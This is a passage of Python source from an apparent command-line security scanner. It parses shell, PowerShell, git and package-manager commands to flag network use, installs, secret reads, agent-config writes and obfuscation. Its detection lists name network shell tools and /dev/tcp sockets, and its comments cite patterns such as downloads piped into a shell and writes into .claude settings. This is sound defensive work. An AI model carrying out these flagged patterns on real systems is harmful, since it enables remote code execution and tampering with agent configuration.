    if program == "git":
        chdir.extend(_chdir_values(program, _leading_options(rest[1:], _GIT_OPTIONS_WITH_VALUE)))
    elif program == "make":
        chdir.extend(_chdir_values(program, rest[1:]))
    return [command(program, rest[1:], rest[0])]


def _leading_options(words: list[str], with_value: frozenset[str]) -> list[str]:
    """The options (and their values) before a program's first word that is not an option."""
    i = 0
    while i < len(words) and words[i].startswith("-") and words[i] != "-":
        i += 2 if words[i] in with_value else 1
    return words[:i]


def _chdir_values(name: str, options: list[str]) -> list[str]:
    """The folders a wrapper's (or git's, make's) options make the program run in: env -C x, sudo --chdir=x."""
    names = _CHDIR_OPTIONS.get(name, ())
    found = []
    for index, option in enumerate(options):
        spelled = option.lower() if name in _CASELESS_OPTIONS else option
        for wanted in names:
            if spelled == wanted and index + 1 < len(options):
                found.append(options[index + 1])
            elif spelled.startswith((wanted + "=", wanted + ":")) or (
                    len(wanted) == 2 and len(spelled) > 2 and spelled.startswith(wanted)):
                found.append(option[len(wanted):].lstrip("=:"))  # --chdir=x, -Cx
    return found


def _placeholder(name: str, options: list[str]) -> str:
    """The text xargs -I (or parallel) replaces with each input in the command; "" when xargs adds it at the end."""
    for index, option in enumerate(options):
        if option == "-I" and index + 1 < len(options):
            return options[index + 1]
        if option.startswith("-I") and len(option) > 2:
            return option[2:]
        if name == "xargs" and option in ("-i", "--replace"):
            return "{}"
        if name == "xargs" and option.startswith("-i"):
            return option[2:]
        if name == "xargs" and option.startswith("--replace="):
            return option.partition("=")[2]
    return "{}" if name == "parallel" else ""


def _powershell_statement(words: list[str]) -> list[str]:
    """Drop an assignment from the start of a PowerShell statement: "$x = iwr ..." runs iwr."""
    if len(words) >= 2 and words[0].startswith("$") and re.fullmatch(r"[-+*/%]?=", words[1]):
        return words[2:]
    if words and re.fullmatch(r"\$[\w:{}.]+[-+*/%]?=", words[0]):
        return words[1:]
    return words


def _after_wrapper(name: str, words: list[str]) -> tuple[list[str], list[str]] | None:
    """The words from the wrapped program on, and the wrapper's own words before them; None when the
    wrapper runs nothing itself.

    env -S 'curl x' and flock f -c 'curl x' give a command text as one word: it
    becomes the program word, which _inner_commands reads as a command line.
    """
    takes_value = _WRAPPERS[name]
    if name == "command" and words and words[0] in ("-v", "-V"):
        return None
    slash_options = name in _SLASH_OPTION_WRAPPERS
    i = 0
    while i < len(words):
        word = words[i]
        lowered = word.lower()
        if name == "env" and _ASSIGNMENT.match(word):
            i += 1
        elif name == "env" and (word in ("-S", "--split-string") or word.startswith(("-S", "--split-string="))):
            # env -S 'curl x' splits the text into the program and its words.
            if word in ("-S", "--split-string"):
                return (words[i + 1:], words[:i + 1]) if words[i + 1:] else None
            return [word[2:] if word.startswith("-S") else word.partition("=")[2], *words[i + 1:]], words[:i + 1]
        elif lowered.startswith("-") and lowered != "-" or slash_options and lowered.startswith("/") and lowered != "/":
            if name in ("start-process", "saps") and "-filepath".startswith(lowered) and len(lowered) > 1:
                return (words[i + 1:], words[:i + 1]) if words[i + 1:] else None
            # Case counts for Unix options (xargs -I {} takes a value, -i does not); not for cmd's and PowerShell's.
            i += 2 if word in takes_value or name in _CASELESS_OPTIONS and lowered in takes_value else 1
        else:
            break
    if name in _WRAPPERS_WITH_A_VALUE and i < len(words):
        i += 1  # the duration, the new root or the lock file
    if name == "start" and i < len(words) and (not words[i] or any(ch.isspace() for ch in words[i])):
        i += 1  # cmd's start takes a first quoted word as the window's title: start "" curl x
    if name == "flock" and words[i:i + 1] and words[i] in ("-c", "--command"):
        return (words[i + 1:i + 2], words[:i + 1]) if words[i + 1:i + 2] else None  # flock f -c 'curl x'
    return (words[i:], words[:i]) if words[i:] else None


def _inner_commands(command: _Command, budget: _Budget, depth: int) -> Iterator[_Command]:
    """Commands that this one runs from its words: bash -c, pwsh -Command, cmd /c, find -exec, a quoted program,
    the words wsl hands to its Linux shell, git settings that are commands, parallel ::: 'command'."""
    program, words = command.program, list(command.words)
    quoted_text = any(ch.isspace() for ch in command.written)
    call = _shell_call(program, words)
    texts = [text for text, _ in call.texts] if call else []
    git_texts = _git_command_texts(words) if program == "git" else []
    if depth + 1 > MAX_DEPTH:
        if texts or git_texts or program in ("find", ":::") or quoted_text or command.relined:
            raise Unreadable("it nests commands more deeply than is followed")
        return
    for text, shell in call.texts if call else ():
        if _SUBST not in text:
            # A script that is a command's output ("sh -c "$(curl ...)"") cannot be read: that command was read
            # already, and the shell running its output counts as obfuscation (and install after a download).
            yield from _read(text, shell, budget, depth + 1)
    for text in git_texts:
        yield from _read(text, "bash", budget, depth + 1)
    if program == ":::":  # parallel ::: 'curl x' 'wget y' runs each word as a command line
        for word in words:
            yield from _read(word, "bash", budget, depth + 1)
    if command.relined:
        yield from _read(" ".join([command.written, *words]), "bash", budget, depth + 1)
    if program == "find":
        for index, word in enumerate(words):
            if word in ("-exec", "-execdir", "-ok", "-okdir"):
                inner = []
                for part in words[index + 1:]:
                    if part in (";", "+"):
                        break
                    inner.append(part)
                budget.spend()
                for found in _simple_commands(inner, [], command.shell, budget.next_pipeline(), 0):
                    yield found
                    yield from _inner_commands(found, budget, depth + 1)
    if quoted_text:
        # A quoted program word with spaces: "C:\Program Files\x\curl.exe" (read above by its last part), or a
        # command text ("watch -n1 'curl https://x'", "env -S 'curl x'"), so it is read as a command line too,
        # with the words after it kept as they were.
        line = " ".join([command.written, *(_quoted(word, command.shell) for word in words)])
        yield from _read(line, command.shell, budget, depth + 1)


def _quoted(word: str, shell: str) -> str:
    """A word quoted so that the shell reads it back as the same single word."""
    if shell == "powershell":
        return "'" + word.replace("'", "''") + "'"
    return "'" + word.replace("'", "'\\''") + "'"


_BASH_FAMILY = frozenset({"bash", "sh", "rbash"})
_CSH_FAMILY = frozenset({"csh", "tcsh"})
_KSH_FAMILY = frozenset({"ksh", "ksh93", "mksh", "pdksh", "oksh", "loksh"})
_POSIX_SHELLS = _BASH_FAMILY | _CSH_FAMILY | _KSH_FAMILY | frozenset({"zsh", "dash", "ash", "yash", "posh", "fish"})
# bash's long options, which it reads before its one-letter ones, with two dashes or one (--rcfile f, -norc).
_BASH_LONG_OPTIONS = frozenset({
    "debug", "debugger", "dump-po-strings", "dump-strings", "help", "init-file", "login", "noediting", "noprofile",
    "norc", "posix", "pretty-print", "protected", "rcfile", "restricted", "verbose", "version", "wordexp",
})
_BASH_LONG_WITH_VALUE = frozenset({"init-file", "rcfile"})
# fish reads its options as getopt does ("+hPilNnvc:C:p:d:f:D:o:"): these letters take a value, -c and -C
# (--init-command) a command text. Its long options may be shortened to any prefix that names one option.
_FISH_VALUE_LETTERS = frozenset("cCpdfDo")
_FISH_LONG_OPTIONS = {
    "command": "c", "init-command": "C", "debug": "d", "debug-output": "o", "debug-stack-frames": "D",
    "features": "f", "profile": "p", "profile-startup": "p", "help": "", "interactive": "", "login": "",
    "no-execute": "", "no-config": "", "private": "", "version": "", "print-rusage-self": "",
    "print-debug-categories": "",
}
# A word a shell may take for its -c: -c, -ec, +c, -xc ... (bash and dash run the command for +c too).
_C_OPTION = re.compile(r"[-+][A-Za-z]*c[A-Za-z]*")
# The names under which a program reads its standard input as a file.
_STDIN_NAMES = frozenset({"-", "/dev/stdin", "/dev/fd/0", "/proc/self/fd/0"})
# Programs that run the command text after -c (or --command) with a shell: su -c 'x', script -qc 'x'.
_DASH_C_RUNNERS = frozenset({"su", "runuser", "script", "sg"})
_POWERSHELLS = frozenset({"powershell", "pwsh"})
# powershell.exe and pwsh options (and the short forms people use) that take a value.
_POWERSHELL_OPTIONS_WITH_VALUE = frozenset({
    "executionpolicy", "ep", "ex", "exec", "windowstyle", "w", "win", "version", "v", "inputformat", "inp", "if",
    "outputformat", "o", "of", "configurationname", "config", "workingdirectory", "wd", "settingsfile",
    "psconsolefile", "custompipename", "encodedcommand", "e", "ec", "en", "enc", "enco", "encodedarguments", "ea",
})
# cmd.exe runs what follows its first /c, /k or /r, wherever it is and whatever is glued to it.
_CMD_RUN_SWITCH = re.compile(r"/([ckr])", re.IGNORECASE)


@dataclass(frozen=True)
class _ShellCall:
    """What a shell program is told to run."""

    texts: tuple[tuple[str, str], ...] = ()  # command texts (bash -c 'x'), each with the shell that reads it
    stdin: bool = False  # it runs the commands of its standard input (echo 'curl x' | bash)
    missing: bool = False  # it was told to run a command text (-c) that is not there: xargs may add it
    script: str | None = None  # the script file it runs (bash -e x.sh, pwsh -File x.ps1)


def _shell_call(program: str, words: list[str]) -> _ShellCall | None:
    """What a shell program runs (see _ShellCall); None for a program that is not a shell."""
    if program == "fish":
        return _fish_call(words)
    if program in _POSIX_SHELLS:
        return _posix_shell_call(program, words)
    if program in _DASH_C_RUNNERS:
        # The -c may come after a user or group name (su root -c x, sg staff -c x), so every word is looked at.
        for index, word in enumerate(words):
            if word.startswith("--command="):
                return _ShellCall(((word.partition("=")[2], "bash"),))
            if word == "--command" or re.fullmatch(r"-[a-zA-Z]*c", word):
                if index + 1 < len(words):
                    return _ShellCall(((words[index + 1], "bash"),))
                return _ShellCall(missing=True)
        return _ShellCall()
    if program in _POWERSHELLS:
        return _powershell_call(program, words)
    if program == "cmd":
        line = " ".join(words)
        found = _CMD_RUN_SWITCH.search(line)
        if found is None:
            return _ShellCall(stdin=True)
        rest = line[found.end():].replace("^", "").strip()  # /ccurl x, /c"curl x", //ccurl x (Git Bash)
        return _ShellCall(((rest, "bash"),)) if rest else _ShellCall(missing=True)
    return None


def _posix_shell_call(program: str, words: list[str]) -> _ShellCall:
    """bash -o pipefail -c 'x', bash -euo pipefail -c 'x', bash -c -e 'x' and bash +x -c 'x' all run x.

    As bash (and dash, zsh, ksh) read their options: bash's long options come
    first (--rcfile f, -norc); then words that start with - or +, each a group of
    letters, where -o and -O (and ksh's -R, -T) take the next word as a value;
    "-" or "--" ends them. With a c among the letters, the first word after the
    options is the command text; csh takes the word right after its -c. A -c
    that lands where the reader cannot place it (as an option's value, or after a
    script file) makes the command unreadable.
    """
    n, i = len(words), 0
    values: list[str] = []  # words taken as an option's value
    if program in _BASH_FAMILY:
        while i < n and words[i].startswith("-"):
            name = words[i][2:] if words[i].startswith("--") else words[i][1:]
            if name not in _BASH_LONG_OPTIONS:
                break
            if name in _BASH_LONG_WITH_VALUE and i + 1 < n:
                values.append(words[i + 1])
                i += 1
            i += 1
    value_letters = "oORT" if program in _KSH_FAMILY else "oO"
    texts: list[str] = []
    wants = reads_stdin = False
    while i < n:
        word = words[i]
        if word in ("-", "--"):
            i += 1
            break
        if word[:1] not in ("-", "+"):
            break
        i += 1
        if word.startswith("--"):
            continue  # a long option of zsh (--emacs); bash refuses one after its one-letter options
        for letter in word[1:]:
            if letter == "c":
                wants = True
                if program in _CSH_FAMILY and i < n:
                    texts.append(words[i])
                    i += 1
            elif letter == "s":
                reads_stdin = True
            elif letter in value_letters and i < n:
                values.append(words[i])
                i += 1
    if wants and program not in _CSH_FAMILY and i < n:
        texts.append(words[i])
    if any(_C_OPTION.fullmatch(value) for value in values) or (
            not wants and any(_C_OPTION.fullmatch(word) for word in words[i:])):
        raise Unreadable(f"a -c given to {program} cannot be placed with certainty")
    stdin = not wants and (i >= n or reads_stdin or words[i] in _STDIN_NAMES)
    return _ShellCall(tuple((text, "bash") for text in texts), stdin=stdin, missing=wants and not texts,
                      script=words[i] if not wants and not stdin else None)


def _fish_call(words: list[str]) -> _ShellCall:
    """fish -c 'x', fish -cx, fish --command=x, fish --comm x and fish -C x (an init command) run x."""
    n, i = len(words), 0
    texts: list[str] = []
    given = missing = False  # a -c was given (not only -C); it had no text
    while i < n:
        word = words[i]
        if word == "--":
            i += 1
            break
        if not word.startswith("-") or word == "-":
            break
        i += 1
        letter, value = "", None
        if word.startswith("--"):
            name, equals, attached = word[2:].partition("=")
            matches = [name] if name in _FISH_LONG_OPTIONS else [long for long in _FISH_LONG_OPTIONS
                                                                  if long.startswith(name)]
            if len(matches) != 1:
                raise Unreadable("an option given to fish cannot be told apart from another")
            letter = _FISH_LONG_OPTIONS[matches[0]]
            value = attached if equals else None
        else:
            for at, char in enumerate(word[1:]):
                if char in _FISH_VALUE_LETTERS:
                    letter, value = char, word[2 + at:] or None
                    break
        if letter and value is None:
            value = words[i] if i < n else None
            i += 1
        if letter == "c":
            given = True
            missing = missing or value is None
        if letter in ("c", "C") and value is not None:
            texts.append(value)
    if not given and any(_C_OPTION.fullmatch(word) or word.startswith("--c") for word in words[i:]):
        raise Unreadable("a -c given to fish cannot be placed with certainty")
    stdin = not given and (i >= n or words[i] in _STDIN_NAMES)
    return _ShellCall(tuple((text, "bash") for text in texts), stdin=stdin, missing=missing,
                      script=words[i] if not given and not stdin else None)


def _powershell_call(program: str, words: list[str]) -> _ShellCall:
    """powershell -Command x (also –Command, with an en dash), powershell.exe's positional command, -File -,
    and a powershell given no command, which runs the commands of its standard input."""
    skip = False
    for index, word in enumerate(words):
        if skip:
            skip = False
            continue
        option = word.lstrip(_DASHES + "/").lower() if word and word[0] in _DASHES + "/" else None
        if option is None:
            # powershell.exe reads the rest as a command; pwsh as a script file and its arguments.
            if program == "powershell":
                return _ShellCall(((" ".join(words[index:]), "powershell"),))
            return _ShellCall(script=word)
        if option in ("c", "command") or (len(option) >= 3 and "command".startswith(option)):
            rest = " ".join(words[index + 1:])
            return _ShellCall(((rest, "powershell"),)) if rest and rest != "-" else _ShellCall(stdin=True)
        if option in ("f", "file") or (len(option) >= 2 and "file".startswith(option)):
            script = words[index + 1] if index + 1 < len(words) else None
            return _ShellCall(stdin=script == "-", script=script if script != "-" else None)
        if _encoded_command_option(option):
            return _ShellCall()  # the code is in the option's value (obfuscation)
        skip = option in _POWERSHELL_OPTIONS_WITH_VALUE
    return _ShellCall(stdin=True)


def _encoded_command_option(option: str) -> bool:
    """-ec, -e, -enc, -EncodedCommand ... (option is lowercased, without its dash)."""
    return option == "ec" or (option.startswith("e") and "encodedcommand".startswith(option))


# git settings whose value is a command git runs (an alias that starts with "!", core.sshCommand ...), or,
# for an alias without "!", git words ("alias.x=push" makes "git x" a push).
_GIT_COMMAND_SETTING = re.compile(
    r"alias\..+|core\.(sshcommand|fsmonitor|pager|editor|askpass)|credential\..*helper|diff\.external|"
    r"(diff|merge|filter)\..+\.(command|driver|textconv|clean|smudge|process)|gpg(\..+)?\.program|"
    r"sequence\.editor|pager\..+|interactive\.difffilter|uploadpack\.packobjectshook|(difftool|mergetool|man)\..+\.cmd",
    re.IGNORECASE,
)


def _git_command_texts(words: list[str]) -> list[str]:
    """The command lines in git's settings: git -c alias.x='!curl ...' x, git config alias.x '!curl ...'."""
    pairs: list[tuple[str, str]] = []
    options = _leading_options(words, _GIT_OPTIONS_WITH_VALUE)
    for index, option in enumerate(options):
        if option == "-c" and index + 1 < len(options):
            key, _, value = options[index + 1].partition("=")
            pairs.append((key, value))
        elif option.startswith("--config-env=") and _GIT_COMMAND_SETTING.fullmatch(option[13:].partition("=")[0]):
            raise Unreadable("git takes a setting that runs a command from an environment variable")
    rest = _positional(words[len(options):], frozenset({"-f", "--file", "--blob", "--type", "--default", "--comment"}))
    if rest[:1] == ["config"]:
        rest = rest[2:] if rest[1:2] == ["set"] else rest[1:]  # git config [set] <key> <value>
        if len(rest) >= 2:
            pairs.append((rest[0], rest[1]))
    texts = []
    for key, value in pairs:
        if not _GIT_COMMAND_SETTING.fullmatch(key) or not value:
            continue
        if key.lower().startswith("alias.") and not value.startswith("!"):
            texts.append("git " + value)
        else:
            texts.append(value[1:] if value.startswith("!") else value)
    return texts


# ---- classes --------------------------------------------------------------------------------

_NETWORK_PROGRAMS = frozenset({
    "curl", "wget", "wget2", "aria2c", "nc", "ncat", "netcat", "socat", "telnet", "ssh", "scp", "sftp", "rsync",
    "ftp", "tftp", "lftp", "ping", "ping6", "nslookup", "dig", "host", "drill", "whois", "traceroute", "tracert",
    "resolve-dnsname", "test-netconnection", "tnc", "iwr", "irm", "invoke-webrequest", "invoke-restmethod",
    "start-bitstransfer", "bitsadmin", "send-mailmessage", "gh", "http", "https", "xh",
})
# Programs that download, for "a download piped to a shell".
_DOWNLOADERS = frozenset({"curl", "wget", "wget2", "aria2c", "iwr", "irm", "invoke-webrequest", "invoke-restmethod",
                          "http", "https", "xh", "certutil", "bitsadmin"})
# Programs that run the text they are given (on stdin, or as a file a substitution names).
_INTERPRETERS = _POSIX_SHELLS | _POWERSHELLS | frozenset({
    "python", "python3", "py", "node", "deno", "bun", "perl", "ruby", "php", "lua", "iex", "invoke-expression",
    "cmd", "source", ".",
})
_GIT_NETWORK = frozenset({"push", "clone", "fetch", "pull", "ls-remote", "send-email", "request-pull"})
_GIT_OPTIONS_WITH_VALUE = frozenset({"-C", "-c", "--git-dir", "--work-tree", "--namespace", "--exec-path"})
# Package managers: the subcommands that install or run a package.
_PACKAGE_INSTALL = {
    "npm": frozenset({"install", "i", "in", "ins", "inst", "add", "ci", "clean-install", "install-test", "it",
                      "exec", "x", "create", "install-ci-test", "cit"}),
    "pnpm": frozenset({"install", "i", "add", "dlx", "create", "install-test", "it"}),
    "yarn": frozenset({"install", "add", "dlx", "create"}),
    "bun": frozenset({"install", "i", "add", "x", "create"}),
    "cnpm": frozenset({"install", "i", "add"}),
    "pip": frozenset({"install", "download"}),
    "pipx": frozenset({"run", "install", "inject", "upgrade"}),
    "gem": frozenset({"install"}),
    "cargo": frozenset({"install"}),
    "go": frozenset({"install", "get"}),
    "brew": frozenset({"install", "reinstall", "tap"}),
    "apt": frozenset({"install"}),
    "apt-get": frozenset({"install"}),
    "winget": frozenset({"install"}),
    "choco": frozenset({"install"}),
    "scoop": frozenset({"install"}),
    "conda": frozenset({"install", "create"}),
    "mamba": frozenset({"install", "create"}),
}
_PACKAGE_OPTIONS_WITH_VALUE = frozenset({"--prefix", "-C", "--dir", "--cwd", "-w", "--workspace", "--filter", "-F",
                                         "--registry"})
_RUNNERS = frozenset({"npx", "pnpx", "bunx", "uvx", "iex", "invoke-expression", "install-package", "install-module",
                      "install-script"})
_PYTHONS = re.compile(r"(python|py)([0-9.]*|w)")
_PIPS = re.compile(r"pip[0-9.]*")
# python -m <module> for these runs that package manager.
_PYTHON_PACKAGE_MODULES = re.compile(r"(pip[0-9.]*|pipx|uv)")
# deno subcommands that run or install code; run, compile and cache count when they name a remote module.
_DENO_INSTALL = frozenset({"install", "i", "add", "x"})
_DENO_RUN = frozenset({"run", "compile", "cache", "bundle", "test", "eval"})
_REMOTE_MODULE = re.compile(r"(https?|npm|jsr):", re.IGNORECASE)
_PROGRAM_WRITERS = frozenset({
    "tee", "cp", "mv", "ln", "install", "touch", "truncate", "rm", "unlink", "dd", "chmod", "chown", "rsync",
    "set-content", "sc", "add-content", "ac", "out-file", "new-item", "ni", "copy-item", "copy", "cpi", "move-item",
    "move", "mi", "remove-item", "ri", "del", "erase", "rename-item", "ren", "rni", "set-itemproperty",
    "tee-object", "export-csv", "export-clixml", "xcopy", "robocopy",
    # Programs that unpack or patch files into a folder they are given: unzip x.zip -d .claude (tar when it extracts).
    "unzip", "7z", "7za", "expand-archive", "patch",
})
# Programs that write the text they are given (from the command line or its pipe) to the files they name.
_TEXT_WRITERS = frozenset({"tee", "tee-object", "set-content", "sc", "add-content", "ac", "out-file"})
# Programs that change the folder later commands of the line run in.
_CD_PROGRAMS = frozenset({"cd", "chdir", "pushd", "set-location", "sl", "push-location"})
# Folders that hold an agent's or a tool's configuration, git's hooks and settings, or keys: a command
# line that changes into one and then writes may write a file there by a plain relative name.
_PROTECTED_FOLDER = re.compile(
    r"(^|[\\/:])\.(git|github|vscode|cursor|claude|codeium|gemini|windsurf|codex|agent-sentinel)([\\/]|$)"
    r"|(^|[\\/])\.[^\\/]*[*?\[]",  # a hidden folder spelled with a wildcard (cd .cl*)
    re.IGNORECASE,
)
# Programs that only read (with no redirection), after a change into such a folder.
_READ_ONLY_PROGRAMS = frozenset({
    "cd", "chdir", "pushd", "popd", "set-location", "sl", "push-location", "pop-location", "ls", "dir", "pwd",
    "cat", "type", "head", "tail", "less", "more", "grep", "egrep", "fgrep", "rg", "wc", "stat", "file", "tree",
    "echo", "printf", "true", "false", "test", "[", "[[", "which", "where", "whoami", "date", "basename",
    "dirname", "realpath", "readlink", "du", "df", "diff", "cmp", "jq", "sha256sum", "sha1sum", "md5sum", "cksum",
    "exit", "get-childitem", "gci", "get-content", "gc", "get-item", "gi", "select-string", "sls", "test-path",
    "resolve-path", "rvpa", "get-location", "gl", "write-output", "write", "write-host", "measure-object",
    "measure", "select-object", "select", "where-object", "?", "sort-object", "format-list", "fl", "format-table",
    "ft", "out-string", "out-host", "out-null", "convertfrom-json", "convertto-json", "get-filehash",
    "get-itemproperty", "gp", "get-acl", "foreach-object", "%",
})
_GIT_READ_ONLY = frozenset({"status", "log", "diff", "show", "blame", "grep", "ls-files", "rev-parse", "describe",
                            "shortlog", "cat-file", "ls-tree"})
# Redirection targets that are not files: discarded output, or the terminal.
_NOT_FILES = frozenset({"/dev/null", "nul", "$null", "/dev/stdout", "/dev/stderr", "/dev/tty", "con"})
# .NET file writes in PowerShell words: [IO.File]::WriteAllText(...), [IO.File]::Copy(...), a StreamWriter.
_DOTNET_WRITE = re.compile(
    r"::(write\w*|append\w*|create\w*|copy|move|replace|open|openwrite)\b|streamwriter|filestream",
    re.IGNORECASE,
)
# The PowerShell profile, which PowerShell runs at every start: $PROFILE, $PROFILE.CurrentUserAllHosts ...
_PROFILE_VARIABLE = re.compile(r"\$\{?profile\b", re.IGNORECASE)
# Bash opens a network connection for a redirection to /dev/tcp/<host>/<port> or /dev/udp/<host>/<port>.
_DEV_SOCKET = re.compile(r"(?:^|[<>&])/dev/(?:tcp|udp)/([^/\s]*)")
_ROUNDABOUT_PATH = re.compile(ROUNDABOUT_PATH_PATTERN)
_IN_PLACE_EDITORS = frozenset({"sed", "perl", "ruby"})
_ENV_LISTERS = frozenset({"get-childitem", "gci", "dir", "ls", "get-item", "gi", "get-content", "gc", "cat", "type"})
_DECODERS = frozenset({"base64", "openssl", "xxd", "certutil"})
# .NET calls in PowerShell words.
_DOTNET_NETWORK = re.compile(
    r"net\.webclient|httpclient|downloadstring|downloadfile|downloaddata|uploadstring|uploadfile|uploaddata|"
    r"uploadvalues|net\.sockets|\[(system\.)?net\.dns\]|webrequest\]::create",
    re.IGNORECASE,
)
_DOTNET_DECODE = re.compile(r"frombase64string", re.IGNORECASE)
_DOTNET_ENVIRONMENT = re.compile(r"\[(system\.)?environment\]::getenvironmentvariables", re.IGNORECASE)

_SECRET_WORD = re.compile(f"{CREDENTIAL_PATTERN}|{AGENT_CONFIG_PATTERN}|{AGENT_SENTINEL_HOME_PATTERN}|"
                          r"(^|[\s\\/:@='\"`<>|;&(,{])\.agent-sentinel([\\/]|$)", re.IGNORECASE)
_PROTECTED_TARGET = re.compile(
    f"{CREDENTIAL_PATTERN}|{AGENT_CONFIG_PATTERN}|{AGENT_SENTINEL_HOME_PATTERN}|"
    r"(^|[\s\\/:@='\"`<>|;&(,{])\.(claude|cursor|codeium|gemini|codex|agent-sentinel)([\\/]|$)",
    re.IGNORECASE,
)

# The host part of a URL, and a word that is a host name (with a user, a port or an scp path).
_URL_HOST = re.compile(r"[A-Za-z][A-Za-z0-9+.-]*://(?:[^/?#@\s]*@)?([^/?#:\s]*)")
_BARE_HOST = re.compile(r"(?:[^@\s/:]+@)?([A-Za-z0-9\x00_-]+(?:\.[A-Za-z0-9\x00_-]+)+)\.?(?::\S*)?")
_HEX_LABEL = re.compile(r"[0-9a-f]{16,}")
_BASE32_LABEL = re.compile(r"[a-z2-7]{20,}")
_LONG_LABEL = 32


def _findings(commands: list[_Command]) -> Iterator[Finding]:
    """Every class each command falls into, with the evidence."""
    pipelines: dict[int, list[_Command]] = {}
    for command in commands:
        pipelines.setdefault(command.pipeline, []).append(command)
    found: list[Finding] = []
    for command in commands:
        earlier = [other for other in pipelines[command.pipeline] if other.position < command.position]
        found.extend(_command_findings(command, earlier))
    network_anywhere = any(finding.kind == NETWORK for finding in found)
    for command in commands:
        # bash <(curl ...), sh -c "$(curl ...)", source <(wget ...): a download run as a script.
        if network_anywhere and command.program in _INTERPRETERS and any(_SUBST in word for word in command.words):
            found.append(_finding(INSTALL, command, f"program '{command.program}' runs a command's output"))
    found.extend(_writes_after_changing_folder(commands))
    found.extend(_runs_what_it_wrote(commands))
    yield from found


def _runs_what_it_wrote(commands: list[_Command]) -> list[Finding]:
    """echo 'curl x' > a.sh; bash a.sh (or ./a.sh) runs text the reader saw only as data: obfuscation."""
    written = set()
    for command in commands:
        targets = list(command.targets)
        if command.program in _TEXT_WRITERS:
            targets.extend(_write_targets(command.words))
        written.update(_plain_path(target) for target in targets if target.lower() not in _NOT_FILES)
    if not written:
        return []
    for command in commands:
        for word in (_script_of(command), command.written):
            if word and _plain_path(word) in written:
                return [_finding(OBFUSCATION, command, f"it runs '{word}', which this command line writes")]
    return []


def _plain_path(word: str) -> str:
    return posixpath.normpath(word.replace("\\", "/")) if word else word


def _writes_after_changing_folder(commands: list[_Command]) -> list[Finding]:
    """cd .claude && echo '{}' > settings.json writes Claude Code's settings by a name no pattern sees: a line
    that changes into a protected folder (cd, pushd, Set-Location, env -C, git -C ...) and runs anything that
    may write (a redirection to a file, or a program not known to only read) is config_write."""
    folder = next((found for found in map(_changed_into, commands) if found), None)
    if folder is None:
        return []
    for command in commands:
        if _may_write(command):
            what = f"program '{command.program}'" if command.program else "a redirection"
            return [_finding(CONFIG_WRITE, command, f"{what} after changing into '{folder}'")]
    return []


def _changed_into(command: _Command) -> str | None:
    """The protected folder this command changes into (or runs its program in), if any."""
    folders = list(command.chdir)
    if command.program in _CD_PROGRAMS:
        folders.extend(_write_targets(command.words))
    for folder in folders:
        if _protected(folder) or any(_PROTECTED_FOLDER.search(spelling) for spelling in _spellings(folder)):
            return folder
    return None


def _may_write(command: _Command) -> bool:
    """True unless the command is known to only read: no redirection to a file, and a program that only reads."""
    if any(target.lower() not in _NOT_FILES for target in command.targets):
        return True
    program = command.program
    if not program:
        return command.shell == "powershell" and bool(command.words)  # an expression may call .NET
    if program == "git":
        subcommand = _positional(command.words, _GIT_OPTIONS_WITH_VALUE)[:1]
        return not (subcommand and subcommand[0].lower() in _GIT_READ_ONLY)
    if program == "find":
        return any(word in ("-delete", "-fprint", "-fprint0", "-fprintf", "-fls") for word in command.words)
    return program not in _READ_ONLY_PROGRAMS


def _finding(kind: str, command: _Command, evidence: str) -> Finding:
    words = tuple(word.lower() for word in command.words[:4])
    return Finding(kind, command.program, words, printable(evidence, limit=120))


def _command_findings(command: _Command, earlier: list[_Command]) -> list[Finding]:
    found = []
    for kind, check in ((NETWORK, _network), (INSTALL, _install), (SECRET_READ, _secret_read),
                        (CONFIG_WRITE, _config_write), (OBFUSCATION, _obfuscation)):
        evidence = check(command, earlier)
        if evidence:
            found.append(_finding(kind, command, evidence))
    if any(finding.kind == NETWORK for finding in found):
        evidence = _encoded_host(command)
        if evidence:
            found.append(_finding(ENCODED_HOST, command, evidence))
    return found


def _positional(words: Iterable[str], with_value: frozenset[str] = frozenset()) -> list[str]:
    """The words that are not options, skipping the value of an option that takes one."""
    found = []
    skip = False
    for word in words:
        if skip:
            skip = False
            continue
        if word.startswith("-") and word != "-":
            skip = word in with_value
            continue
        found.append(word)
    return found


def _network(command: _Command, earlier: list[_Command]) -> str | None:
    program, words = command.program, command.words
    if program in _NETWORK_PROGRAMS:
        return f"program '{program}'"
    if program == "certutil" and any(word.lstrip("-/").lower() in ("urlcache", "verifyctl") for word in words):
        return "program 'certutil' with -urlcache"
    if program == "git":
        positional = _positional(words, _GIT_OPTIONS_WITH_VALUE)
        if positional and positional[0].lower() in _GIT_NETWORK:
            return f"'git {positional[0].lower()}'"
        if positional[:2] in (["remote", "update"], ["submodule", "update"]):
            return f"'git {' '.join(positional[:2])}'"
    if program in ("npm", "pnpm", "yarn") and _subcommand(words) in ("publish", "unpublish"):
        return f"'{program} {_subcommand(words)}'"
    for word in (*words, *command.targets):
        if _DEV_SOCKET.search(word):
            return f"a connection through '{word}'"
    if command.shell == "powershell":
        for word in (program, *words):
            if _DOTNET_NETWORK.search(word):
                return f"a .NET network call in '{word}'"
    return None


def _subcommand(words: Iterable[str]) -> str:
    positional = _positional(words, _PACKAGE_OPTIONS_WITH_VALUE)
    return positional[0].lower() if positional else ""


def _python_module(words: list[str]) -> tuple[str, list[str]] | None:
    """The module of "python [options] -m <module> ..." (py -3 -m pip, python -I -m pip), and the words after it."""
    i = 0
    while i < len(words):
        word = words[i]
        found = re.fullmatch(r"-[A-Za-z]*m(.*)", word) if not word.startswith("--") else None
        if found:
            if found.group(1):
                return found.group(1).lower(), words[i + 1:]  # -mpip
            return (words[i + 1].lower(), words[i + 2:]) if i + 1 < len(words) else None
        if word.startswith("-c") or not word.startswith("-") or word == "-":
            return None  # inline code, a script or stdin: no module
        i += 2 if word in ("-W", "-X", "--check-hash-based-pycs") else 1
    return None


def _install(command: _Command, earlier: list[_Command]) -> str | None:
    program, words = command.program, list(command.words)
    if program in _RUNNERS:
        return f"program '{program}'"
    name = "pip" if _PIPS.fullmatch(program) else program
    module = _python_module(words) if _PYTHONS.fullmatch(program) else None
    if module and _PYTHON_PACKAGE_MODULES.fullmatch(module[0]):
        name, words = ("pip" if module[0].startswith("pip") and module[0] != "pipx" else module[0]), module[1]
        program = name
    if program == "deno":
        positional = _positional(words)
        sub = positional[0].lower() if positional else ""
        if sub in _DENO_INSTALL or sub in _DENO_RUN and any(_REMOTE_MODULE.match(word) for word in positional[1:]):
            return f"'deno {sub}'"
    if name in _PACKAGE_INSTALL:
        sub = _subcommand(words)
        if sub in _PACKAGE_INSTALL[name] or (name == "yarn" and sub in ("", "global")):
            return f"'{name} {sub}'" if sub else f"'{name}'"
